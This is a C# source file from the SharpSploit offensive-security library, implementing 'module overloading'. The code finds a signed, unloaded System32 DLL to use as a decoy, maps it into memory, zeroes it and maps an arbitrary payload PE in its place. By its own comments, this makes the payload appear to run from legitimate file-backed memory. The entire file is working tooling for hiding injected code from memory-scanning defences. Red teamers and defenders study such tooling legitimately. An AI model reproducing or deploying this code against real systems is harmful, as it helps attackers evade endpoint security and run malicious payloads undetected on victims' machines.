using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

using Execute = SharpSploit.Execution;

namespace SharpSploit.Execution.ManualMap
{
    public class Overload
    {
        /// <summary>
        /// Locate a signed module with a minimum size which can be used for overloading.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="MinSize">Minimum module byte size.</param>
        /// <returns>
        /// String, the full path for the candidate module if one is found, or an empty string if one is not found.
        /// </returns>
        public static string FindDecoyModule(long MinSize)
        {
            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            Random r = new Random();
            List<int> candidates = new List<int>();
            while (candidates.Count != files.Count)
            {
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                if (candidates.Contains(rInt) == false &&
                    new FileInfo(currentCandidate).Length >= MinSize &&
                    Misc.Utilities.FileHasValidSignature(currentCandidate) == true)
                {
                    return currentCandidate;
                }
                candidates.Add(rInt);
            }
            return string.Empty;
        }

        /// <summary>
        /// Load a signed decoy module into memory, creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="PayloadPath">Full path to the payload module on disk.</param>
        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null)
        {
            // Verify process & architecture
            bool isWOW64 = DynamicInvoke.Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Module overloading in WOW64 is not supported.");
            }

            // Get approximate size of Payload
            if (!File.Exists(PayloadPath))
            {
                throw new InvalidOperationException("Payload filepath not found.");
            }
            byte[] Payload = File.ReadAllBytes(PayloadPath);

            return OverloadModule(Payload, DecoyModulePath);
        }

        /// <summary>
        /// Load a signed decoy module into memory creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="Payload">Full byte array for the payload module.</param>
        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null)
        {
            // Verify process & architecture
            bool isWOW64 = DynamicInvoke.Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Module overloading in WOW64 is not supported.");
            }

            // Did we get a DecoyModule?
            if (!string.IsNullOrEmpty(DecoyModulePath))
            {
                if (!File.Exists(DecoyModulePath))
                {
                    throw new InvalidOperationException("Decoy filepath not found.");
                }
                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
                if (DecoyFileBytes.Length < Payload.Length)
                {
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
                }
            }
            else
            {
                DecoyModulePath = FindDecoyModule(Payload.Length);
                if (string.IsNullOrEmpty(DecoyModulePath))
                {
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
                }
            }

            // Map decoy from disk
            Execute.PE.PE_MANUAL_MAP DecoyMetaData = Map.MapModuleFromDisk(DecoyModulePath);
            IntPtr RegionSize = DecoyMetaData.PEINFO.Is32Bit ? (IntPtr)DecoyMetaData.PEINFO.OptHeader32.SizeOfImage : (IntPtr)DecoyMetaData.PEINFO.OptHeader64.SizeOfImage;

            // Change permissions to RW
            DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Execute.Win32.WinNT.PAGE_READWRITE);

            // Zero out memory
            DynamicInvoke.Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);

            // Overload module in memory
            PE.PE_MANUAL_MAP OverloadedModuleMetaData = Map.MapModuleToMemory(Payload, DecoyMetaData.ModuleBase);
            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;

            return OverloadedModuleMetaData;
        }
    }
}
